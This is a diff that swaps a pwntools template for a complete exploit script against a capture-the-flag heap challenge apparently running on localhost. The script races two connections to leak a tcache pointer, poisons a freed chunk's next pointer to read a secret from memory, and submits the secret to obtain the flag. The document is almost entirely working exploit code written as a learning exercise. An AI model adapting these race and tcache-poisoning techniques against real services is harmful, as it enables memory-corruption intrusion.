@@ -1,32 +1,121 @@
-#!/usr/bin/env python3
-
+import time 
 from pwn import *
+import os
 
-exe = ELF("./babyprime_level1.0_patched")
-libc = ELF("./libc.so.6")
-ld = ELF("./ld-linux-x86-64.so.2")
+def leak_tcache(r1, r2):
+	if os.fork() == 0: # .fork() duplicates a new process. There will be exactly two processes - child and parent running the same python script at the same time
+	
+	# os.fork() == 0 is the child, child does the following
+		for _ in range(10000):
+			r1.sendline(b"malloc 0")
+			r1.sendline(b"scanf 0")
+			r1.sendline(b"AAAABBBB")
+			r1.sendline(b"free 0") # hope for write() of printf to go right after this
+		exit(0) # kills the child
+		
+	# else, parent (os.fork() returns pid
+	else:
+		for _ in range(10000):
+			r2.sendline(b"printf 0")
+		os.wait() # waits for the child to finish
+	output_set = set(r2.clean().splitlines())
+	# .clean() gets the output
+	# .splitlines() split the output by lines
+	# set() gets the unique lines
+	print(output_set)
+	for output in output_set: # checking if there's a leak like b'MESSAGE: \x00@^J\x07\x00\x00\x00' starting from '\x00'
+		if output[9:10] == b'\x00': # for bytes object, output[i] outputs integer
+			result = output[-8:]
+			print(result)
+			return u64(result)
+	return 0
 
-context.binary = exe
 
 
-def conn():
-    if args.LOCAL:
-        r = process([exe.path])
-        if args.DEBUG:
-            gdb.attach(r)
-    else:
-        r = remote("addr", 1337)
-
-    return r
 
 
-def main():
-    r = conn()
-
-    # good luck pwning :)
-
-    r.interactive()
 
 
-if __name__ == "__main__":
-    main()
+
+
+idx = 1
+def arbitrary_read(r1, r2, addr, heap_base_addr):
+	global idx
+	r1.clean()
+	r2.clean()
+	
+	addr_packed = p64(addr ^ heap_base_addr)
+	r1.sendline(f"malloc {idx}".encode()) # chunk A
+	r1.sendline(f"malloc {idx + 1}".encode()) # chunk B
+	r1.sendline(f"free {idx + 1}".encode()) # free B
+	
+	while True:
+		print("Running Arbitrary Read")
+		if os.fork() == 0:
+			r1.sendline(f"free {idx}".encode()) # free A
+			exit(0)
+		else:
+			r2.send((f"scanf {idx} ".encode() + addr_packed + b"\n") * 2000)
+			# trying to fit scanf i <addr> between "free A (i)" and "stored[i] == 0"
+			# overwriting freed A's next pointer to be the target address
+			os.wait()
+		
+		time.sleep(0.1)
+		r1.sendline(f"malloc {idx}".encode()) # this malloc gets A
+		r1.sendline(f"printf {idx}".encode())
+		r1.readuntil(b"MESSAGE: ")
+		stored = r1.readline()[:-1] #
+	#	print(stored)
+	#	print(addr_packed.split(b'\x00')[0])
+		
+		if stored == addr_packed.split(b'\x00')[0]: # checks if A's stored address (next pointer) is exactly our injected address
+			break
+	
+	r1.sendline(f"malloc {idx + 1}".encode()) # gets B (returned at injected address's location
+	r1.clean()
+	r1.sendline(f"printf {idx + 1}".encode())
+	r1.readuntil(b"MESSAGE: ")
+	output = r1.readline()[:-1]
+	leak = u64(output[:8].ljust(8, b'\x00')) 
+	idx += 2
+	return leak
+	
+	
+	
+	
+
+p = process('./babyprime_level1.0_patched')
+r1 = remote("localhost", 1337)
+r2 = remote("localhost", 1337)
+leak = leak_tcache(r1, r2)
+
+if leak:
+	print("tcache next pointer: ", hex(leak))
+	
+	print(f"\nGDB: gdb -p {p.pid}")
+	pause()
+
+
+	secret = arbitrary_read(r1, r2, 0x4054c0, leak)
+	secret = secret.to_bytes(8, 'little')
+	print(f"Secret string: {secret}")
+
+	r1.clean()
+	r1.sendline(b"send_flag")
+	r1.recvuntil(b"Secret: ")
+	r1.sendline(secret)
+	response = r1.recvall(timeout=2)
+	print(f"Server response: {response}")	
+else:
+	print("Failed to leak")
+
+
+
+p.kill()
+
+
+# this is too good
+# I think this is by far my favourite challenge
+# so fucking challenging and thus so fucking fun to learn with
+
+
